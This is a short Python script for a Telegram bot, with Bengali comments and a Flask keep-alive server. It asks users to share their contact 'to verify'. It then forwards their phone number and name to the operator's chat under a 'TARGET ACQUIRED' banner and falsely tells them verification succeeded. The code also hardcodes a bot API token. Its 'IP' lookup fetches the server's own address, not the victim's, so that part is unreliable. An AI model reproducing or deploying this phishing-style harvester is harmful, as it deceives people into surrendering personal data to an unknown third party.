import telebot
import requests
import os
from threading import Thread
from flask import Flask

# ১. রেন্ডারের পোর্ট সমস্যা সমাধানের জন্য ছোট সার্ভার
app = Flask('')

@app.route('/')
def home():
    return "Bot is running properly!"

def run():
    # রেন্ডার থেকে পোর্ট নিয়ে সার্ভার চালু করা
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# ২. বটের মেইন কনফিগারেশন
API_TOKEN = '8580731044:AAESaTbEO65fLxF3WiZnPtyUTYjajrhkR-I'
MY_ID = '8046944525'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "Welcome! Please share your contact to verify.")

@bot.message_handler(content_types=['contact'])
def contact(m):
    try:
        # IP তথ্য নেওয়ার চেষ্টা
        res = requests.get("http://ip-api.com/json/", timeout=10).json()
        ip = res.get("query", "N/A")
        
        text = f"🚀 **TARGET ACQUIRED**\n\n📱 **Phone:** `{m.contact.phone_number}`\n👤 **Name:** {m.contact.first_name}\n🌐 **IP:** `{ip}`"
        
        bot.send_message(MY_ID, text, parse_mode="Markdown")
        bot.send_message(m.chat.id, "✅ Verification Successful!")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    # সার্ভার এবং বট একসাথে চালানো
    Thread(target=run).start()
    print("SERVER STARTING...")
    bot.infinity_polling(timeout=10, long_polling_timeout=5)
